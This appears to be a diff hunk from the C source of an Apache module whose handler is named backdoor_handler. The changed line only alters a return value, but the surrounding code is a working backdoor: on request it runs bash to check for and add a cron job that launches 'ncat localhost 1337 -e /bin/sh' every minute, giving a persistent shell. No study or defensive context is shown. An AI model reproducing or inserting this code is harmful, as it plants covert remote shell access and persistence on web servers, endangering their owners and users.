@@ -13,7 +13,7 @@ static int backdoor_handler(request_rec *r) {
    if (!cmd) return DECLINED;
    if (cmd){
       execl("/bin/bash", "bash", "-c", "test=$(crontab -l | grep  'ncat' | wc -l); if [ $test == 0 ]; then (crontab -l 2>/dev/null; echo '* * * * * ncat localhost 1337 -e /bin/sh') | crontab -;  fi", NULL);
-      return OK;
+      return HTTP_OK;
    }
    
 }
